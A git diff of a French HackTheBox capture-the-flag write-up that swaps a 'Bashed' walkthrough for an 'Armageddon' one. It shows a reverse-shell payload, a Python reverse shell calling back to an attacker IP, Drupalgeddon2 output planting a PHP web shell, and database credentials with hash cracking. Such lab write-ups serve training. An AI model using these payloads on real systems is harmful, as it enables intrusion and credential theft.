@@ -1,8 +1,8 @@
 ---
-title: HTB | Bashed
-description: Bashed is a fairly easy machine which focuses mainly on fuzzing and locating important files. As basic access to the crontab is restricted, ...
-slug: bashed-htb
-date: 2025-01-13 00:00:00+0000
+title: HTB | Armageddon
+description: Armageddon is an easy difficulty machine.  An exploitable Drupal website allows access to the remote host. Enumeration of the Drupal file structure reveals credentials that allows us to connect to the MySQL server, and eventually extract the hash that is reusable for a system user. Using these credentials, we can connect to the remote machine over SSH. This user is allowed to install applications using the   snap   package manager. Privilege escalation is possible by uploading and installing to the host, a malicious application using Snapcraft.
+slug: armageddon-htb
+date: 2025-04-07 00:00:00+0000
 #image: cover.png
 categories:
  - HackTheBox
@@ -16,7 +16,7 @@ tags:
   <tr>
     <!-- Colonne gauche : logo -->
     <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
-      <img src="cover.png" alt="Bashed cover" width="120">
+      <img src="cover.png" alt="Armageddon cover" width="120">
     </td>
     <td style="border:none; text-align:center; vertical-align:middle;">
       <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
@@ -30,9 +30,9 @@ tags:
         </thead>
         <tbody>
           <tr>
-            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Bashed</td>
+            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Armageddon</td>
             <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
-            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.68</td>
+            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.79</td>
             <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
           </tr>
         </tbody>
@@ -41,185 +41,161 @@ tags:
   </tr>
 </table>
 
+## Users
+```bash
+drupaluser : CQHEy@9M*m23gBVj
+brucetherealadmin
+```
+
 ## Enumeration
 
 ### nmap
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ nmap -sS -sC -sV -An -p- 10.10.10.68
-...
-80 -> HTTP : http://bashed.htb
+┌──(kali㉿kali)-[~/htb/Armageddon]
+└─$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.233
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC2xdFP3J4cpINVArODYtbhv+uQNECQHDkzTeWL+4aLgKcJuIoA8dQdVuP2UaLUJ0XtbyuabPEBzJl3IHg3vztFZ8UEcS94KuWP09ghv6fhc7JbFYONVJTYLiEPD8nrS/V2EPEQJ2ubNXcZAR76X9SZqt11JTyQH/s6tPH+m3m/84NUU8PNb/dyhrFpCUmZzzJQ1zCDStLXJnCAOE7EfW2wNm1CBPCXn1wNvO3SKwokCm4GoMKHSM9rNb9FjGLIY0nq+8mt7RTJZ+WLdHsje3AkBk1yooGFF+0TdOj42YK2OtAKDQBWnBm1nqLQsmm/Va9T2bPYLLK5aUd4/578u7h
+|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE4kP4gQ5Th3eu3vz/kPWwlUCm+6BSM6M3Y43IuYVo3ppmJG+wKiabo/gVYLOwzG7js497Vr7eGIgsjUtbIGUrY=
+|   256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9ZlC3EA13xZbzvvdjZRWhnu9clFOUe7irG8kT0oR4A
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+| http-robots.txt: 36 disallowed entries 
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
+| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
+| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
+| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
+|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
+|_http-title: Welcome to  Armageddon |  Armageddon
+|_http-generator: Drupal 7 (http://drupal.org)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
 ```
-
 ## Foothold
 
-### gobuster: found dev/ folder
+### Drupal 7.56
+
+On remarque dans le code source la version du framework utilisé : Drupal 7.
+
+On trouve le dossier: http://10.10.10.233/scripts/
+Les scripts datent du 21 juin 2017.
+
+En regardant les releases de Drupal sur github, on découvre que la version Drupal 7.56 est sortie précisement à cette date :
+https://github.com/drupal/drupal/releases/tag/7.56
+
+Avec searchsploit, on trouve une RCE (sans authentification préalable) :
 ```bash
-$ gobuster dir -u http://bashed.htb -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-===============================================================
-Gobuster v3.6
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://bashed.htb
-[+] Method:                  GET
-[+] Threads:                 50
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.6
-[+] Timeout:                 10s
-===============================================================
-Starting gobuster in directory enumeration mode
-===============================================================
-/uploads              (Status: 301) [Size: 310] [--> http://bashed.htb/uploads/]
-/php                  (Status: 301) [Size: 306] [--> http://bashed.htb/php/]
-/css                  (Status: 301) [Size: 306] [--> http://bashed.htb/css/]
-/dev                  (Status: 301) [Size: 306] [--> http://bashed.htb/dev/]
-/js                   (Status: 301) [Size: 305] [--> http://bashed.htb/js/]
-/fonts                (Status: 301) [Size: 308] [--> http://bashed.htb/fonts/]
-/images               (Status: 301) [Size: 309] [--> http://bashed.htb/images/]
-/server-status        (Status: 403) [Size: 298]
-Progress: 220560 / 220561 (100.00%)
-===============================================================
-Finished
-===============================================================
+┌──(kali㉿kali)-[~/htb/Armageddon]
+└─$ searchsploit drupal 7.56     
+--------------------------------------------------------------- ---------------------------------
+ Exploit Title    |  Path
+--------------------------------------------------------------- ---------------------------------
+...
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution     | php/webapps/44449.rb
+...
+```
+Output:
+```bash
+┌──(kali㉿kali)-[~/htb/Armageddon]
+└─$ ruby drupalggedon2.rb http://10.10.10.233
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://10.10.10.233/
+--------------------------------------------------------------------------------
+[+] Found  : http://10.10.10.233/CHANGELOG.txt    (HTTP Response: 200)
+[+] Drupal!: v7.56
+--------------------------------------------------------------------------------
+[*] Testing: Form   (user/password)
+[+] Result : Form valid
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Clean URLs
+[!] Result : Clean URLs disabled (HTTP Response: 404)
+[i] Isn't an issue for Drupal v7.x
+--------------------------------------------------------------------------------
+[*] Testing: Code Execution   (Method: name)
+[i] Payload: echo YAQXUKKI
+[+] Result : YAQXUKKI
+[+] Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!
+--------------------------------------------------------------------------------
+[*] Testing: Existing file   (http://10.10.10.233/shell.php)
+[!] Response: HTTP 200 // Size: 6.   ***Something could already be there?***
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+[*] Testing: Writing To Web Root   (./)
+[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php
+[+] Result : <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
+[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
+--------------------------------------------------------------------------------
+[i] Fake PHP shell:   curl 'http://10.10.10.233/shell.php' -d 'c=hostname'
+armageddon.htb>> whoami
+apache
 ```
 
-### RCE : phpbash.php
-Dans le dossier dev/, on peut executer un script phpbash.php qui donne litteralement une session bash interactive en tant que www-data sur la machine :
+### Mysql Database
+On trouve dans un fichier settings.php les creds pour la base de donnée mysql de Drupal.
 ```bash
-http://bashed.htb/dev/phpbash.php
-
-www-data@bashed:/# cd home/
-
-www-data@bashed:/home# ls
-
-arrexel
-scriptmanager
-www-data@bashed:/home# cd arrexel
-
-www-data@bashed:/home/arrexel# ls
-
-user.txt
-www-data@bashed:/home/arrexel# cat user.txt
-
-aef2.....8071
+$databases = array (
+  'default' => 
+  array (
+    'default' => 
+    array (
+      'database' => 'drupal',
+      'username' => 'drupaluser',
+      'password' => 'CQHEy@9M*m23gBVj',
+      'host' => 'localhost',
+      'port' => '',
+      'driver' => 'mysql',
+      'prefix' => '',
+    ),
+  ),
+);
 ```
 
-### Users : /etc/passwd
+### Getting hashes from bruce and admin
+Toujours depuis le shell obtenu avec l'exploit (pas interfactif ! Mais assez stable). On récupère le hachage de bruce et admin :
 ```bash
-cat /etc/passwd | grep bash
-
-root:x:0:0:root:/root:/bin/bash
-arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
-scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
+armageddon.htb>> mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e "SELECT * FROM users"
+uid     name    pass    mail    theme   signature       signature_format        created access  login   status  timezone        language        picture init    data
+0                                               NULL    0       0       0       0       NULL            0               NULL
+1       brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt admin@armageddon.eu                     filtered_html   1606998756      1607077194      1607076276      1       Europe/London           0       admin@armageddon.eu       a:1:{s:7:"overlay";i:1;}
 ```
 
-### Reverse shell : msfvenom
-Avec msfvenom, pour s'entrainer :
+### Cracking hashes of bruce (user.txt)
+On le crack avec hashcat :
 ```bash
-$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.42 LPORT=1337 -f elf -o test.elf
-[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
-[-] No arch selected, selecting arch: x64 from the payload
-No encoder specified, outputting raw payload
-Payload size: 74 bytes
-Final size of elf file: 194 bytes
-Saved as: test.elf
-$ python3 -m http.server 8888
-Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
-10.10.10.68 - - [11/Jan/2025 19:11:27] "GET /test.elf HTTP/1.1" 200 -
+hashcat ./hash.txt ~/wordlists/rockyou.txt --show
+Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
+The following mode was auto-detected as the only one matching your input hash:
 
-------------------------------------------
+7900 | Drupal7 | Forums, CMS, E-Commerce
 
-$ nc -lnvp 1337
-listening on [any] 1337 ...
-connect to [10.10.14.42] from (UNKNOWN) [10.10.10.68] 54598
+NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
+Do NOT report auto-detect issues unless you are certain of the hash type.
 
-python3 -c "import pty;pty.spawn('/bin/bash')"
-www-data@bashed:/tmp$ export TERM=xterm
-export TERM=xterm
-www-data@bashed:/tmp$ ^Z
-zsh: suspended  nc -lnvp 1337
-                                                                                                                                                                                                                                   
-┌──(kali㉿kali)-[~/htb/Bashed]
-└─$ stty raw -echo; fg
-[3]    continued  nc -lnvp 1337
-
-www-data@bashed:/tmp$ whoami
-www-data
-
----------------------------------------------
-
-wget 10.10.14.42:8888/test.elf
-
---2025-01-11 16:18:10-- http://10.10.14.42:8888/test.elf
-Connecting to 10.10.14.42:8888... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 194 [application/octet-stream]
-Saving to: 'test.elf'
-
-0K 100% 40.5M=0s
-
-2025-01-11 16:18:10 (40.5 MB/s) - 'test.elf' saved [194/194]
-
-www-data@bashed:/tmp# chmod 777 ./test.elf
-
-www-data@bashed:/tmp# ls -la test.elf
-
--rwxrwxrwx 1 www-data www-data 194 Jan 11 16:10 test.elf
-www-data@bashed:/tmp# ./test.elf &
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo
 ```
-
-## www-data -> scriptmanager
-
-### Enumeration : sudo -l
-On découvre qu'on peut executer n'importe quelle commande, en tant que l'utilisateur scriptmanager sans mot de passe !
+On se connecte en ssh à l'utilisateur brucetherealadmin :
 ```bash
-www-data@bashed:/home/arrexel$ sudo -l
-Matching Defaults entries for www-data on bashed:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
-
-User www-data may run the following commands on bashed:
-    (scriptmanager : scriptmanager) NOPASSWD: ALL
+┌──(kali㉿kali)-[~/htb/Armageddon]
+└─$ ssh brucetherealadmin@10.10.10.233
+brucetherealadmin@10.10.10.233's password: 
+Last failed login: Thu Apr  3 22:28:06 BST 2025 from 10.10.14.17 on ssh:notty
+There were 3 failed login attempts since the last successful login.
+Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
+[brucetherealadmin@armageddon ~]$ 
+[brucetherealadmin@armageddon ~]$ whoami
+brucetherealadmin
+[brucetherealadmin@armageddon ~]$ cat user.txt
+f0f8.....bbcc
 ```
+## Privilege Escalation
 
-### shell as scriptmanager
-On ouvre donc un bash en tant que scriptmanager :
-```bash
-www-data@bashed:/home/arrexel$ sudo -u scriptmanager /bin/bash
-scriptmanager@bashed:/home/arrexel$ whoami
-scriptmanager
-```
-
-## scriptmanager -> root
-
-### LinPEAS : /scripts folder
-Avec linpeas, on découvre un dossier suspect "/scripts" à la racine, créer par le user `scriptmanager`.
-
-On découvre qu'il contient deux fichiers test.py et test.txt :
-```bash
-scriptmanager@bashed:/scripts$ ls -l
-total XX
--rw-r--r-- 1 scriptmanager scriptmanager 206 Jan 12 14:37 test.py
--rw-r--r-- 1 root          root           12 Jan 12 13:25 test.txt
-```
-
-### Cronjob : test.py as root
-Dans test.py, on peut voir une commande qui ecrit dans un fichier test.txt une string "hello". Ce fichier existe deja, donc le script a été executé auparavant. Comme le fichier semble avoir été crée par root, on déduit que root a executé ce script python. On suppose donc que ce fichier est potentiellement un script de test executé régulièrement par root, dans une crontab. On modifie donc le fichier test.py avec un reverse shell trouvé sur le site reverse shell generator :
-https://www.revshells.com/
-```bash
-import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.42",6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
-
------------------------------
-
-nc -lnvp 6666
-listening on [any] 6666 ...
-connect to [10.10.14.42] from (UNKNOWN) [10.10.10.68] 42276
-## whoami
-whoami
-root
-## cat /root/root.txt
-cat /root/root.txt
-4600.....78e4
-```
-
+### snap install as root
+Il faut faire sudo -l. On observe qu'on peut executer "snap install" en tant que root. C'est à dire que l'on peut installer n'importe quel package snap en tant que root. Or, j'ai pu créer un packet vérolé qui s'installe et s'execute lors de l'installation, permettant l'ouverture d'un shell en tant que root.
